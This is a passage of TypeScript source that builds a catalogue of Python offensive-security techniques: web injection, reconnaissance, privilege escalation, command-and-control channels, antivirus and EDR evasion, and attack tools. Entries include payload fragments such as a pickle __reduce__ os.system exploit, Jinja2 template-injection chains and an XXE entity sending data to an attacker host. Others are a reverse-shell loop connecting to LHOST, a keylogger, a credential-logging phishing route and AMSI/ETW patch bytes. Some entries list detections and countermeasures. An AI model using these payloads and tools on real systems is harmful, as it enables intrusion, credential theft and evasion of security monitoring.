  add({ id: 'pyweb-sqli-second-order', name: 'Second-Order SQL Injection', category: 'sqli', description: 'Inject payload that is stored and executed later in a different query context — bypasses input validation at injection point', pythonApproach: 'Register/store malicious payload in first request, trigger execution via second endpoint that uses stored data unsafely in SQL', libraries: ['requests'], owaspCategory: 'A03:2021-Injection', difficulty: 'advanced' });
  add({ id: 'pyweb-xss-scanner', name: 'XSS Vulnerability Scanner', category: 'xss', description: 'Automated XSS detection using polyglot payloads, context-aware injection, DOM analysis, and WAF bypass techniques', pythonApproach: 'Crawl target with requests/BeautifulSoup, inject XSS polyglots in all parameters, check reflection in response, test filter bypasses', libraries: ['requests', 'beautifulsoup4', 'selenium'], owaspCategory: 'A03:2021-Injection', difficulty: 'intermediate' });
  add({ id: 'pyweb-ssrf-chain', name: 'SSRF Exploitation Chain', category: 'ssrf', description: 'Chain SSRF to access internal services — cloud metadata, internal APIs, Redis/Memcached for RCE, port scanning behind firewall', pythonApproach: 'requests with URL parameter injection pointing to internal IPs (127.0.0.1, 169.254.169.254), gopher:// protocol for Redis commands', libraries: ['requests'], owaspCategory: 'A10:2021-SSRF', difficulty: 'advanced' });
  add({ id: 'pyweb-ssti', name: 'Server-Side Template Injection', category: 'ssti', description: 'Detect and exploit SSTI in Jinja2/Mako/Tornado — achieve RCE via MRO traversal and __subclasses__ chain', pythonApproach: '{{7*7}} detection, then {{"".__class__.__mro__[1].__subclasses__()}} enumeration, find os._wrap_close or subprocess.Popen for RCE', libraries: ['requests'], owaspCategory: 'A03:2021-Injection', difficulty: 'advanced' });
  add({ id: 'pyweb-lfi', name: 'LFI/RFI Exploitation', category: 'lfi_rfi', description: 'Local/Remote File Inclusion via path traversal — read /etc/passwd, access log poisoning for RCE, PHP wrapper abuse', pythonApproach: 'requests with ../../ traversal sequences, null byte injection, PHP wrapper (php://filter/convert.base64-encode), log poisoning via User-Agent', libraries: ['requests'], owaspCategory: 'A01:2021-Broken Access Control', difficulty: 'intermediate' });
  add({ id: 'pyweb-rce-deser', name: 'Python Deserialization RCE', category: 'deserialization', description: 'Exploit Python pickle/yaml deserialization — craft malicious pickle objects with __reduce__ for arbitrary code execution', pythonApproach: 'class Exploit: def __reduce__(self): return (os.system, ("command",)); pickle.dumps(Exploit()). Also YAML: !!python/object/apply:os.system ["cmd"]', libraries: ['pickle', 'pyyaml'], owaspCategory: 'A08:2021-Software and Data Integrity', difficulty: 'advanced' });
  add({ id: 'pyweb-jwt-attack', name: 'JWT Token Exploitation', category: 'auth_bypass', description: 'JWT attacks — algorithm confusion (RS256→HS256), none algorithm, key brute force, claim manipulation for privilege escalation', pythonApproach: 'Decode JWT (base64), change alg to none or HS256 with public key, modify claims (role/sub/admin), re-sign with jwt library', libraries: ['pyjwt', 'requests'], owaspCategory: 'A07:2021-Auth Failures', difficulty: 'intermediate' });
  add({ id: 'pyweb-xxe', name: 'XXE Injection Automation', category: 'xxe', description: 'Automated XXE exploitation — file read, SSRF via external entities, out-of-band data exfiltration, billion laughs DoS', pythonApproach: 'Craft XML with DOCTYPE ENTITY pointing to file:///etc/passwd or http://attacker/exfil, send via requests with Content-Type: application/xml', libraries: ['requests', 'lxml'], owaspCategory: 'A05:2021-Security Misconfiguration', difficulty: 'intermediate' });
  add({ id: 'pyweb-webshell', name: 'Python Web Shell', category: 'web_shell', description: 'Minimal Python web shell using Flask/http.server — command execution, file browser, reverse shell trigger, encrypted communication', pythonApproach: 'Flask app with OS command execution endpoint, file upload/download, obfuscated routes, authentication token, AES encrypted responses', libraries: ['flask', 'subprocess'], owaspCategory: 'A03:2021-Injection', difficulty: 'intermediate' });
  add({ id: 'pyweb-api-abuse', name: 'REST API Exploitation', category: 'api_abuse', description: 'API security testing — BOLA/IDOR enumeration, rate limit bypass, mass assignment, parameter pollution, GraphQL introspection', pythonApproach: 'Iterate numeric/UUID IDs for BOLA, add extra JSON fields for mass assignment, X-Forwarded-For rotation for rate limit bypass', libraries: ['requests'], owaspCategory: 'A01:2021-Broken Access Control', difficulty: 'intermediate' });

  return db;
}

function buildReconTechniques(): ReconTechnique[] {
  const db: ReconTechnique[] = [];
  const add = (r: ReconTechnique) => { db.push(r); };

  add({ id: 'pyrecon-port-scan', name: 'Python Port Scanner', category: 'port_scan', description: 'Multi-threaded TCP/SYN port scanner — connect scan, SYN scan with Scapy, service version detection via banner grabbing', pythonApproach: 'socket.connect_ex() for TCP connect, Scapy IP()/TCP(flags="S") for SYN scan, ThreadPoolExecutor for parallelism, recv banner for service ID', libraries: ['socket', 'scapy', 'concurrent.futures'], passiveOrActive: 'active', difficulty: 'beginner' });
  add({ id: 'pyrecon-osint', name: 'OSINT Gathering Framework', category: 'osint', description: 'Automated OSINT collection — search engines, social media, public databases, document metadata, email patterns', pythonApproach: 'requests/BeautifulSoup for web scraping, Google dorking automation, social media API querying, PDF metadata extraction with PyPDF2', libraries: ['requests', 'beautifulsoup4', 'tweepy'], passiveOrActive: 'passive', difficulty: 'intermediate' });
  add({ id: 'pyrecon-subdomain', name: 'Subdomain Enumeration', category: 'subdomain_enum', description: 'Multi-source subdomain discovery — DNS brute force, certificate transparency, search engine scraping, zone transfer attempts', pythonApproach: 'DNS brute with dnspython + wordlist, CT log API queries (crt.sh), search engine scraping, AXFR zone transfer attempt', libraries: ['dnspython', 'requests', 'concurrent.futures'], passiveOrActive: 'active', difficulty: 'intermediate' });
  add({ id: 'pyrecon-dns-enum', name: 'DNS Enumeration', category: 'dns_enum', description: 'Comprehensive DNS record enumeration — A, AAAA, MX, NS, TXT, SOA, CNAME, SRV, PTR records, zone transfer, DNS cache snooping', pythonApproach: 'dnspython resolver.resolve() for all record types, AXFR via dns.zone.from_xfr(), reverse DNS lookups, SPF/DMARC analysis', libraries: ['dnspython'], passiveOrActive: 'active', difficulty: 'beginner' });
  add({ id: 'pyrecon-webfinger', name: 'Web Technology Fingerprinting', category: 'web_fingerprint', description: 'Identify web technologies, frameworks, and versions — HTTP headers, HTML patterns, JavaScript libraries, CMS detection', pythonApproach: 'requests HEAD/GET, parse Server/X-Powered-By headers, match known HTML patterns (wp-content, drupal.js), detect JavaScript frameworks', libraries: ['requests', 'beautifulsoup4'], passiveOrActive: 'active', difficulty: 'beginner' });
  add({ id: 'pyrecon-email-harvest', name: 'Email Address Harvesting', category: 'email_harvest', description: 'Discover email addresses from websites, search engines, and public sources — build target list for phishing campaigns', pythonApproach: 'Scrape company website and LinkedIn with BeautifulSoup, search engine dorking (site:target.com email), extract from WHOIS/DNS', libraries: ['requests', 'beautifulsoup4', 'dnspython'], passiveOrActive: 'passive', difficulty: 'beginner' });
  add({ id: 'pyrecon-vuln-scan', name: 'Vulnerability Scanner', category: 'vuln_scan', description: 'Automated vulnerability scanning — CVE database lookup, service version matching, exploit availability checking, risk scoring', pythonApproach: 'python-nmap for service detection, match versions against CVE database API (NVD), check exploit-db for PoCs, generate risk report', libraries: ['python-nmap', 'requests'], passiveOrActive: 'active', difficulty: 'intermediate' });
  add({ id: 'pyrecon-network-map', name: 'Network Topology Mapping', category: 'network_map', description: 'Discover network topology via traceroute, ARP scanning, SNMP enumeration — build network map with device relationships', pythonApproach: 'Scapy traceroute for path discovery, ARP scan for LAN devices, SNMP community string brute + OID walk, NetworkX for graph building', libraries: ['scapy', 'pysnmp', 'networkx'], passiveOrActive: 'active', difficulty: 'intermediate' });
  add({ id: 'pyrecon-service-enum', name: 'Service Enumeration', category: 'service_enum', description: 'Deep service enumeration — SMB shares, NFS exports, SNMP MIBs, LDAP directory, MySQL/MSSQL databases, RPC interfaces', pythonApproach: 'impacket for SMB/RPC/LDAP enumeration, pysnmp for SNMP OID walking, custom scripts for database enumeration, concurrent scanning', libraries: ['impacket', 'pysnmp', 'ldap3'], passiveOrActive: 'active', difficulty: 'advanced' });
  add({ id: 'pyrecon-social', name: 'Social Media Reconnaissance', category: 'social_recon', description: 'Gather intelligence from social media — employee profiles, technology mentions, organizational structure, leaked credentials', pythonApproach: 'API-based and scraping approaches for LinkedIn/Twitter/GitHub, extract job postings for tech stack, monitor paste sites for leaks', libraries: ['requests', 'beautifulsoup4', 'selenium'], passiveOrActive: 'passive', difficulty: 'intermediate' });

  return db;
}

function buildPrivEscPaths(): PrivEscPath[] {
  const db: PrivEscPath[] = [];
  const add = (p: PrivEscPath) => { db.push(p); };

  add({ id: 'pyprivesc-suid', name: 'SUID Binary Exploitation', platform: 'linux', category: 'suid', description: 'Find and exploit SUID binaries — GTFOBins lookup, custom SUID exploitation, shared library injection for SUID programs', pythonApproach: 'os.walk("/") to find SUID files (stat.S_ISUID), match against GTFOBins database, generate exploit commands for each binary', prerequisites: ['local_access', 'suid_binary_present'], successRate: 0.6 });
  add({ id: 'pyprivesc-sudo', name: 'Sudo Misconfiguration Abuse', platform: 'linux', category: 'sudo', description: 'Exploit sudo misconfigurations — NOPASSWD entries, sudoedit, LD_PRELOAD, env_keep abuse, sudo version exploits', pythonApproach: 'Parse sudo -l output, match entries against known escalation paths, check sudo version for CVEs (e.g., CVE-2021-3156 Baron Samedit)', prerequisites: ['local_access', 'sudo_access'], successRate: 0.7 });
  add({ id: 'pyprivesc-kernel', name: 'Linux Kernel Exploit', platform: 'linux', category: 'kernel', description: 'Match kernel version against known exploits — DirtyPipe, DirtyCow, OverlayFS, Netfilter exploits for root', pythonApproach: 'uname -r kernel version check, match against CVE database (DirtyCow CVE-2016-5195, DirtyPipe CVE-2022-0847), download and compile exploit', prerequisites: ['local_access', 'vulnerable_kernel'], successRate: 0.5 });
  add({ id: 'pyprivesc-cron', name: 'Cron Job Exploitation', platform: 'linux', category: 'cron', description: 'Exploit writable cron jobs, PATH manipulation in cron, wildcard injection in cron-executed scripts', pythonApproach: 'Parse /etc/crontab and cron.d, check file permissions with os.access(), detect wildcard usage for tar/rsync injection, monitor with pspy', prerequisites: ['local_access', 'writable_cron_file'], successRate: 0.65 });
  add({ id: 'pyprivesc-caps', name: 'Linux Capabilities Abuse', platform: 'linux', category: 'capabilities', description: 'Exploit files with elevated capabilities — CAP_SETUID on Python/Perl, CAP_DAC_READ_SEARCH for file read, CAP_NET_RAW for sniffing', pythonApproach: 'Parse getcap output, match against known escalation capabilities (CAP_SETUID, CAP_DAC_OVERRIDE), generate payload for each capability', prerequisites: ['local_access', 'capability_present'], successRate: 0.55 });
  add({ id: 'pyprivesc-service', name: 'Service Exploitation', platform: 'linux', category: 'service', description: 'Exploit misconfigured services — writable service files, insecure service permissions, service binary hijacking', pythonApproach: 'Enumerate systemd units, check file permissions on ExecStart paths, detect writable service configs, inject reverse shell in service file', prerequisites: ['local_access', 'writable_service'], successRate: 0.6 });
  add({ id: 'pyprivesc-registry', name: 'Windows Registry Exploitation', platform: 'windows', category: 'registry', description: 'Exploit weak registry permissions — AlwaysInstallElevated, writable service registry keys, auto-start entries', pythonApproach: 'winreg module to enumerate keys, check ACLs on HKLM services, detect AlwaysInstallElevated policy, modify ImagePath for service hijack', prerequisites: ['local_access', 'weak_registry_acl'], successRate: 0.55 });
  add({ id: 'pyprivesc-token', name: 'Windows Token Manipulation', platform: 'windows', category: 'token', description: 'Token impersonation — SeImpersonatePrivilege abuse (Potato attacks), token duplication, CreateProcessWithToken for SYSTEM', pythonApproach: 'ctypes OpenProcessToken/DuplicateTokenEx/CreateProcessWithTokenW, or Potato exploit for SeImpersonatePrivilege to SYSTEM', prerequisites: ['local_access', 'impersonate_privilege'], successRate: 0.7 });
  add({ id: 'pyprivesc-dll', name: 'DLL Hijacking', platform: 'windows', category: 'dll_hijack', description: 'Exploit DLL search order — place malicious DLL in application directory, service DLL hijacking, phantom DLL loading', pythonApproach: 'Process Monitor analysis automation, identify missing DLLs in search path, generate malicious DLL with ctypes, place in target directory', prerequisites: ['local_access', 'writable_dll_path'], successRate: 0.65 });
  add({ id: 'pyprivesc-path', name: 'PATH Hijacking', platform: 'cross_platform', category: 'path_hijack', description: 'Exploit insecure PATH in scripts/services — create malicious binary in writable PATH directory that precedes legitimate one', pythonApproach: 'Analyze target script for unqualified binary calls, find writable directory earlier in PATH, create malicious binary or symlink', prerequisites: ['local_access', 'writable_path_dir'], successRate: 0.6 });
  add({ id: 'pyprivesc-unquoted', name: 'Unquoted Service Path', platform: 'windows', category: 'unquoted_service', description: 'Exploit Windows unquoted service paths with spaces — place executable at intermediate path for privilege escalation', pythonApproach: 'WMI query for services with unquoted paths containing spaces, check write permissions on intermediate directories, place payload', prerequisites: ['local_access', 'unquoted_service_path'], successRate: 0.5 });

  return db;
}

function buildC2Configs(): C2Config[] {
  const db: C2Config[] = [];
  const add = (c: C2Config) => { db.push(c); };

  add({ id: 'pyc2-http', name: 'HTTP/S C2 Channel', protocol: 'https', description: 'HTTPS-based C2 using legitimate-looking web traffic — request/response model with encrypted payloads in HTTP body or headers', pythonApproach: 'Flask/FastAPI server with command queue, client polls with requests, commands/results in encrypted JSON, domain fronting for stealth', libraries: ['flask', 'requests', 'pycryptodome'], stealthRating: 0.7, features: ['encrypted_comms', 'domain_fronting', 'jitter', 'beaconing', 'file_transfer'] });
  add({ id: 'pyc2-dns', name: 'DNS Tunneling C2', protocol: 'dns', description: 'Exfiltrate data and receive commands via DNS queries — encode data in subdomain labels, responses in TXT/CNAME records', pythonApproach: 'dnspython for queries with base32-encoded data in subdomain labels, custom authoritative DNS server to decode and respond with commands', libraries: ['dnspython', 'dnslib'], stealthRating: 0.8, features: ['firewall_bypass', 'encoded_data', 'low_bandwidth', 'bidirectional'] });
  add({ id: 'pyc2-icmp', name: 'ICMP Covert Channel', protocol: 'icmp', description: 'Hide C2 communication in ICMP echo request/reply payload — bypass firewalls that allow ping, low detection rate', pythonApproach: 'Scapy ICMP packet crafting with encrypted payload in data field, custom sequence numbers for ordering, ping-like timing pattern', libraries: ['scapy', 'pycryptodome'], stealthRating: 0.85, features: ['firewall_bypass', 'encrypted_payload', 'low_profile', 'ping_mimicry'] });
  add({ id: 'pyc2-websocket', name: 'WebSocket C2', protocol: 'websocket', description: 'Full-duplex C2 over WebSocket — real-time bidirectional communication disguised as legitimate web app traffic', pythonApproach: 'websockets library for async bidirectional channel, JSON command/response protocol, TLS encryption, reconnection with backoff', libraries: ['websockets', 'asyncio'], stealthRating: 0.7, features: ['full_duplex', 'real_time', 'tls_encrypted', 'reconnection'] });
  add({ id: 'pyc2-smtp', name: 'Email-Based C2', protocol: 'smtp', description: 'C2 over email — commands sent as emails to dead-drop accounts, results exfiltrated as attachments or encoded email bodies', pythonApproach: 'smtplib/imaplib for send/receive, commands in email body with encoding, results as encrypted attachments, multiple dead-drop accounts', libraries: ['smtplib', 'imaplib', 'email'], stealthRating: 0.75, features: ['asynchronous', 'dead_drop', 'encrypted_attachments', 'legitimate_traffic'] });
  add({ id: 'pyc2-p2p', name: 'Peer-to-Peer C2', protocol: 'p2p', description: 'Decentralized P2P mesh C2 — no single point of failure, DHT-based peer discovery, encrypted inter-node communication', pythonApproach: 'Custom P2P protocol with node discovery, Kademlia DHT for peer finding, encrypted tunnels between nodes, command propagation via gossip', libraries: ['socket', 'threading', 'pycryptodome'], stealthRating: 0.8, features: ['decentralized', 'resilient', 'no_single_point_failure', 'mesh_network'] });
  add({ id: 'pyc2-cloud', name: 'Cloud Service C2', protocol: 'cloud_api', description: 'Abuse cloud storage/messaging services as C2 infrastructure — Dropbox, Google Drive, Slack, Telegram API for command delivery', pythonApproach: 'Cloud provider API (dropbox, google-api-python-client, slack_sdk, python-telegram-bot) for file-based command/response, encrypted blobs', libraries: ['requests', 'dropbox'], stealthRating: 0.85, features: ['cloud_infrastructure', 'legitimate_domains', 'encrypted_storage', 'api_abuse'] });
  add({ id: 'pyc2-social', name: 'Social Media C2', protocol: 'social_media', description: 'Use social media platforms as C2 channels — encoded commands in posts/comments, image steganography for data transfer', pythonApproach: 'Platform API or scraping for command delivery in posts, steganography in images for data exfiltration, dead-drop comment threads', libraries: ['requests', 'pillow', 'beautifulsoup4'], stealthRating: 0.8, features: ['social_media_blend', 'steganography', 'dead_drop', 'high_availability'] });
  add({ id: 'pyc2-custom-tcp', name: 'Custom Encrypted TCP C2', protocol: 'custom_tcp', description: 'Raw TCP C2 with custom protocol — length-prefixed messages, AES-GCM encryption, certificate pinning, multiplexed channels', pythonApproach: 'socket + ssl with custom protocol header (magic + length + encrypted payload), AES-GCM authenticated encryption, asyncio for multiplexing', libraries: ['socket', 'ssl', 'pycryptodome', 'asyncio'], stealthRating: 0.5, features: ['custom_protocol', 'aes_gcm', 'cert_pinning', 'multiplexing'] });

  return db;
}

function buildEvasionMethods(): EvasionMethod[] {
  const db: EvasionMethod[] = [];
  const add = (e: EvasionMethod) => { db.push(e); };

  add({ id: 'pyev-av-bypass', name: 'AV Signature Bypass', category: 'av_bypass', description: 'Bypass antivirus signature detection — XOR encoding, AES encryption of payload, custom packers, string obfuscation', pythonApproach: 'XOR encode shellcode with random key, AES encrypt payload with runtime decryption stub, replace string literals with chr() concatenation', targetDefense: 'Antivirus (Signature-based)', effectiveness: 0.7 });
  add({ id: 'pyev-edr-bypass', name: 'EDR Evasion Techniques', category: 'edr_bypass', description: 'Bypass EDR solutions — direct syscalls, unhooking ntdll, ETW patching, PPID spoofing, process hollowing from Python', pythonApproach: 'ctypes for direct syscall invocation (NtAllocateVirtualMemory), unhook ntdll by loading fresh copy from disk, patch ETW provider', targetDefense: 'Endpoint Detection & Response', effectiveness: 0.6 });
  add({ id: 'pyev-sandbox', name: 'Sandbox Detection & Evasion', category: 'sandbox_detect', description: 'Detect analysis sandboxes — check CPU count, RAM size, disk size, mouse movement, recent files, sleep timing analysis', pythonApproach: 'os.cpu_count() < 2, psutil.virtual_memory().total < 4GB, check for VM artifacts (vmtoolsd, VBoxService), GetCursorPos delta check', targetDefense: 'Sandbox/VM Analysis', effectiveness: 0.75 });
  add({ id: 'pyev-amsi', name: 'AMSI Bypass', category: 'amsi_bypass', description: 'Bypass Windows Antimalware Scan Interface — patch AmsiScanBuffer in memory, amsi.dll unhooking, reflection-based bypass', pythonApproach: 'ctypes to locate amsi.dll!AmsiScanBuffer, patch first bytes with ret instruction (0xC3), or VirtualProtect + WriteProcessMemory approach', targetDefense: 'AMSI (Windows)', effectiveness: 0.65 });
  add({ id: 'pyev-etw', name: 'ETW Patching', category: 'etw_bypass', description: 'Disable Event Tracing for Windows — patch EtwEventWrite in ntdll to prevent security tools from receiving telemetry', pythonApproach: 'ctypes to locate ntdll!EtwEventWrite, VirtualProtect to make writable, patch with ret (0xC3), restore after operations', targetDefense: 'ETW (Event Tracing for Windows)', effectiveness: 0.7 });
  add({ id: 'pyev-obfuscation', name: 'Python Code Obfuscation', category: 'obfuscation', description: 'Obfuscate Python source — variable renaming, string encryption, control flow flattening, dead code insertion, pyc compilation', pythonApproach: 'ast module for source transformation, base64/ROT13 string encoding, lambda chains for control flow, compile to .pyc with marshal', targetDefense: 'Static Analysis', effectiveness: 0.6 });
  add({ id: 'pyev-packing', name: 'Executable Packing', category: 'packing', description: 'Pack Python scripts into standalone executables with custom loaders — PyInstaller with custom bootloader, Nuitka compilation', pythonApproach: 'PyInstaller --onefile with UPX compression, custom spec file for resource manipulation, Nuitka compilation to native code for better evasion', targetDefense: 'File-based Detection', effectiveness: 0.55 });
  add({ id: 'pyev-process-hollow', name: 'Process Hollowing', category: 'process_hollowing', description: 'Spawn suspended process, unmap original image, inject malicious code at original base address, resume execution', pythonApproach: 'ctypes CreateProcess(SUSPENDED), NtUnmapViewOfSection, VirtualAllocEx at image base, WriteProcessMemory, SetThreadContext, ResumeThread', targetDefense: 'Process Monitoring', effectiveness: 0.7 });
  add({ id: 'pyev-unhooking', name: 'DLL Unhooking', category: 'unhooking', description: 'Remove EDR hooks from ntdll.dll — load clean copy from disk, overwrite .text section, restore original syscall stubs', pythonApproach: 'Read ntdll.dll from C:\\Windows\\System32\\ntdll.dll, parse PE headers, map .text section, VirtualProtect + memcpy to overwrite hooked version', targetDefense: 'API Hooking (EDR)', effectiveness: 0.65 });
  add({ id: 'pyev-timestomp', name: 'Timestamp Manipulation', category: 'timestomping', description: 'Modify file timestamps to blend in — change creation, modification, access times to match legitimate system files', pythonApproach: 'os.utime() for access/modification times, ctypes SetFileTime for Windows creation time, match timestamps to nearby legitimate files', targetDefense: 'Timeline Forensics', effectiveness: 0.7 });

  return db;
}

function buildPythonTools(): PythonTool[] {
  const db: PythonTool[] = [];
  const add = (t: PythonTool) => { db.push(t); };

  // Recon tools
  add({ id: 'pytool-portscanner', name: 'Threaded Port Scanner', domain: 'reconnaissance', description: 'Multi-threaded TCP connect scanner with banner grabbing and service fingerprinting', pythonLibraries: ['socket', 'concurrent.futures'], codeTemplate: 'with ThreadPoolExecutor(max_workers=100) as executor: futures = {executor.submit(scan_port, target, port): port for port in range(1, 65536)}', difficulty: 'beginner', targetOS: 'cross_platform', mitreTechnique: 'T1046 - Network Service Scanning', stealthRating: 0.3, reliability: 0.9, prerequisites: ['network_access'], detection: ['IDS port scan alerts', 'Firewall connection logs'], countermeasures: ['Rate limiting', 'Port knocking', 'IDS/IPS rules'] });
  add({ id: 'pytool-subdomain-enum', name: 'Subdomain Enumerator', domain: 'reconnaissance', description: 'Multi-source subdomain discovery combining DNS brute force, certificate transparency logs, and search engine scraping', pythonLibraries: ['dnspython', 'requests', 'concurrent.futures'], codeTemplate: 'for sub in wordlist: try: dns.resolver.resolve(f"{sub}.{domain}", "A"); found.append(sub); except: pass', difficulty: 'beginner', targetOS: 'cross_platform', mitreTechnique: 'T1590.002 - DNS', stealthRating: 0.5, reliability: 0.85, prerequisites: ['target_domain'], detection: ['DNS query volume alerts', 'CT log monitoring'], countermeasures: ['DNS rate limiting', 'Wildcard DNS'] });

  // Network attack tools
  add({ id: 'pytool-arp-spoofer', name: 'ARP Spoofing Tool', domain: 'network_attack', description: 'ARP cache poisoning tool for MITM positioning — bidirectional spoofing with automatic restoration on exit', pythonLibraries: ['scapy'], codeTemplate: 'def spoof(target_ip, spoof_ip): pkt = ARP(op=2, pdst=target_ip, hwdst=getmacbyip(target_ip), psrc=spoof_ip); send(pkt, verbose=False)', difficulty: 'intermediate', targetOS: 'linux', mitreTechnique: 'T1557.002 - ARP Cache Poisoning', stealthRating: 0.4, reliability: 0.85, prerequisites: ['same_network_segment', 'root_access'], detection: ['ARP monitoring', 'Static ARP entries', 'DAI'], countermeasures: ['Dynamic ARP Inspection', 'Static ARP', '802.1X'] });
  add({ id: 'pytool-packet-sniffer', name: 'Network Packet Sniffer', domain: 'network_attack', description: 'Raw socket packet capture with protocol parsing — IP, TCP, UDP, ICMP header decoding and payload extraction', pythonLibraries: ['scapy', 'socket'], codeTemplate: 'sniff(iface="eth0", prn=process_packet, filter="tcp port 80", store=0)', difficulty: 'beginner', targetOS: 'linux', mitreTechnique: 'T1040 - Network Sniffing', stealthRating: 0.8, reliability: 0.95, prerequisites: ['promiscuous_mode', 'root_access'], detection: ['Network interface monitoring', 'PROMISC detection'], countermeasures: ['Encryption (TLS)', 'Network segmentation', 'Switch port security'] });

  // Web tools
  add({ id: 'pytool-dir-buster', name: 'Web Directory Brute Forcer', domain: 'web_exploitation', description: 'Multi-threaded web directory and file enumeration with custom wordlists, extensions, and response filtering', pythonLibraries: ['requests', 'concurrent.futures'], codeTemplate: 'for word in wordlist: for ext in extensions: url = f"{target}/{word}{ext}"; r = requests.get(url); if r.status_code != 404: found.append(url)', difficulty: 'beginner', targetOS: 'cross_platform', mitreTechnique: 'T1595.003 - Wordlist Scanning', stealthRating: 0.2, reliability: 0.8, prerequisites: ['target_url'], detection: ['WAF alerts', 'High request volume', 'Error rate spike'], countermeasures: ['WAF', 'Rate limiting', 'Custom 404 pages'] });
  add({ id: 'pytool-sqli-scanner', name: 'SQL Injection Scanner', domain: 'web_exploitation', description: 'Automated SQLi detection with error-based, UNION-based, and time-based blind injection testing across all parameters', pythonLibraries: ['requests', 'beautifulsoup4'], codeTemplate: 'payloads = ["\'", "\' OR 1=1--", "\' UNION SELECT NULL--"]; for param in params: for p in payloads: r = requests.get(url, params={param: p}); check_sqli(r)', difficulty: 'intermediate', targetOS: 'cross_platform', mitreTechnique: 'T1190 - Exploit Public-Facing Application', stealthRating: 0.3, reliability: 0.75, prerequisites: ['target_url', 'parameter_discovery'], detection: ['WAF SQL patterns', 'Error log monitoring', 'IDS signatures'], countermeasures: ['Parameterized queries', 'WAF', 'Input validation'] });

  // Malware tools
  add({ id: 'pytool-keylogger', name: 'Cross-Platform Keylogger', domain: 'malware', description: 'Keyboard event capture with active window tracking, clipboard monitoring, and periodic encrypted exfiltration', pythonLibraries: ['pynput', 'requests', 'pycryptodome'], codeTemplate: 'from pynput.keyboard import Listener; def on_press(key): log.append(str(key)); listener = Listener(on_press=on_press); listener.start()', difficulty: 'intermediate', targetOS: 'cross_platform', mitreTechnique: 'T1056.001 - Keylogging', stealthRating: 0.5, reliability: 0.85, prerequisites: ['user_access', 'persistence'], detection: ['API hooking detection', 'Process monitoring', 'Behavioral analysis'], countermeasures: ['Anti-keylogger software', 'Secure input methods', 'EDR'] });
  add({ id: 'pytool-reverse-shell', name: 'Encrypted Reverse Shell', domain: 'malware', description: 'AES-encrypted reverse shell with PTY support, file transfer, and persistence capabilities', pythonLibraries: ['socket', 'subprocess', 'pycryptodome'], codeTemplate: 'sock = socket.socket(); sock.connect((LHOST, LPORT)); while True: cmd = decrypt(sock.recv(4096)); output = subprocess.check_output(cmd, shell=True); sock.send(encrypt(output))', difficulty: 'intermediate', targetOS: 'cross_platform', mitreTechnique: 'T1059.006 - Python', stealthRating: 0.4, reliability: 0.8, prerequisites: ['network_access', 'code_execution'], detection: ['Network anomaly detection', 'Process tree analysis', 'Encrypted traffic inspection'], countermeasures: ['Egress filtering', 'Application whitelisting', 'Network monitoring'] });

  // C2 tools
  add({ id: 'pytool-dns-c2', name: 'DNS Tunneling C2 Server', domain: 'c2_framework', description: 'Command and control via DNS queries — commands encoded in TXT records, data exfiltration via subdomain labels', pythonLibraries: ['dnspython', 'dnslib', 'pycryptodome'], codeTemplate: 'class DNSHandler: def handle(self, data): query = dns.message.from_wire(data); subdomain = str(query.question[0].name).split(".")[0]; decoded_data = base64.b32decode(subdomain)', difficulty: 'advanced', targetOS: 'cross_platform', mitreTechnique: 'T1071.004 - DNS', stealthRating: 0.8, reliability: 0.7, prerequisites: ['dns_server_control', 'domain_name'], detection: ['DNS query length analysis', 'Entropy analysis', 'Volume-based anomaly'], countermeasures: ['DNS monitoring', 'DNS sinkholing', 'DNS-over-HTTPS inspection'] });

  // Evasion tools
  add({ id: 'pytool-sandbox-detect', name: 'Sandbox Detection Suite', domain: 'evasion', description: 'Comprehensive sandbox/VM detection — hardware checks, timing analysis, user interaction verification, environment fingerprinting', pythonLibraries: ['os', 'ctypes', 'psutil', 'time'], codeTemplate: 'checks = [cpu_count() >= 2, virtual_memory().total > 4*GB, disk_usage("/").total > 60*GB, mouse_moved(), recent_files_exist()]', difficulty: 'intermediate', targetOS: 'cross_platform', mitreTechnique: 'T1497 - Virtualization/Sandbox Evasion', stealthRating: 0.9, reliability: 0.7, prerequisites: ['code_execution'], detection: ['Behavioral analysis of detection routines', 'Anti-analysis technique signatures'], countermeasures: ['Bare-metal analysis', 'Kernel-level monitoring', 'Hardware-assisted analysis'] });

  // Privesc tools
  add({ id: 'pytool-linux-enum', name: 'Linux Privilege Escalation Enumerator', domain: 'privilege_escalation', description: 'Comprehensive Linux privesc enumeration — SUID/SGID, capabilities, cron jobs, writable paths, kernel version, sudo rules', pythonLibraries: ['os', 'subprocess', 'stat', 'grp'], codeTemplate: 'for root, dirs, files in os.walk("/"): for f in files: path = os.path.join(root, f); if os.stat(path).st_mode & stat.S_ISUID: suid_bins.append(path)', difficulty: 'intermediate', targetOS: 'linux', mitreTechnique: 'T1548.001 - Setuid and Setgid', stealthRating: 0.7, reliability: 0.9, prerequisites: ['local_access'], detection: ['File access auditing', 'Auditd rules'], countermeasures: ['Minimize SUID binaries', 'AppArmor/SELinux', 'Audit logging'] });

  // Crypto tools
  add({ id: 'pytool-hash-cracker', name: 'Password Hash Cracker', domain: 'crypto_attack', description: 'Multi-algorithm hash cracking — dictionary, rule-based, brute force attacks for MD5, SHA, bcrypt, NTLM with GPU support', pythonLibraries: ['hashlib', 'itertools', 'concurrent.futures'], codeTemplate: 'for word in wordlist: if hashlib.md5(word.encode()).hexdigest() == target_hash: return word', difficulty: 'beginner', targetOS: 'cross_platform', mitreTechnique: 'T1110.002 - Password Cracking', stealthRating: 0.9, reliability: 0.6, prerequisites: ['hash_value', 'wordlist'], detection: ['Offline — no network detection'], countermeasures: ['Strong password policy', 'Argon2/bcrypt', 'Salting'] });

  // Social engineering tools
  add({ id: 'pytool-phishing-server', name: 'Phishing Campaign Server', domain: 'social_engineering', description: 'Credential harvesting phishing server — cloned login pages, email delivery, click tracking, credential logging', pythonLibraries: ['flask', 'requests', 'beautifulsoup4', 'smtplib'], codeTemplate: 'app = Flask(__name__); @app.route("/login", methods=["POST"]): creds = request.form; log_credentials(creds); return redirect(real_site)', difficulty: 'intermediate', targetOS: 'cross_platform', mitreTechnique: 'T1566.001 - Spearphishing Attachment', stealthRating: 0.5, reliability: 0.7, prerequisites: ['domain_name', 'smtp_access', 'target_list'], detection: ['Email security gateways', 'URL reputation', 'User awareness'], countermeasures: ['Security awareness training', 'Email filtering', 'MFA'] });

  // Forensics evasion tools
